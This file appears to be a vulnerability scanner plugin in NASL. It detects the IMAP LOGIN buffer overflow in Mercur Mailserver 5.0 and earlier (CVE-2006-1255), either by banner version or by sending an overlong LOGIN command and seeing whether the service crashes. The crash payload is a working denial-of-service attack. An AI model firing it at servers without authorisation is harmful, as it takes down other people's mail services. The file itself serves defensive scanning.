# SPDX-FileCopyrightText: 2008 Ferdy Riphagen
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.200050");
  script_version("2023-07-13T05:06:09+0000");
  script_tag(name:"last_modification", value:"2023-07-13 05:06:09 +0000 (Thu, 13 Jul 2023)");
  script_tag(name:"creation_date", value:"2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_cve_id("CVE-2006-1255");
  script_xref(name:"OSVDB", value:"23950");
  script_name("Mercur Mailserver/Messaging <= 5.0 IMAP Overflow Vulnerability");
  script_category(ACT_MIXED_ATTACK);
  script_family("Gain a shell remotely");
  script_copyright("Copyright (C) 2008 Ferdy Riphagen");
  script_dependencies("imap4_banner.nasl");
  script_require_ports("Services/imap", 143);
  script_mandatory_keys("imap/mercur/detected");

  script_xref(name:"URL", value:"http://secunia.com/advisories/19267/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/17138");
  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/fulldisclosure/2006-02/1837.html");

  script_tag(name:"summary", value:"The Mercur IMAP4 Service running on the host is vulnerable to
  buffer overflows by sending a special crafted 'login' command.");

  script_tag(name:"vuldetect", value:"Depending on the 'safe_checks' setting of the scan
  configuration:

  - Setting 'yes': Checks if a vulnerable version is present on the target host

  - Setting 'no': Sends crafted SMTP requests and checks if the system is still responding
  afterwards");

  script_tag(name:"impact", value:"An attacker can use this to crash the service, possible execute
  arbitrary code and gain some access privileges on the system.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("imap_func.inc");
include("version_func.inc");
include("port_service_func.inc");

port = imap_get_port(default:143);
banner = imap_get_banner(port:port);
if(!banner || banner !~ "MERCUR.*IMAP4.Server" )
  exit(0);

if(safe_checks()) {
  if(banner && ver = egrep(pattern:".*MERCUR.*IMAP4.Server.*(v(4\.03|5\.00))", string:banner)) {
    report = report_fixed_ver(installed_version:ver, fixed_version:"See solution tag");
    security_message(port:port, data:report);
    exit(0);
  }
  exit(99);
} else {
  soc = open_sock_tcp(port);
  if(!soc)
    exit(0);

  exp = string("a0 LOGIN ", crap(data:raw_string(0x41), length:300), "\r\n");
  send(socket:soc, data:exp);

  recv = recv(socket:soc, length:1024);
  close(soc);

  soc = open_sock_tcp(port);
  if(soc) {
    send(socket:soc, data:string("a1 CAPABILITY \r\n"));
    recv2 = recv(socket:soc, length:1024);
    close(soc);
  }

  if(!soc || (!strlen(recv2))) {
    report = string("*** It was possible to crash the MERCUR IMAP4 Service.\n",
                    "*** At this time the remote service does not accepting any new requests.\n",
                    "*** You should check its state, and possible start it manually again.");
    security_message(port:port, data:report);
    exit(0);
  }
  exit(99);
}

exit(0);
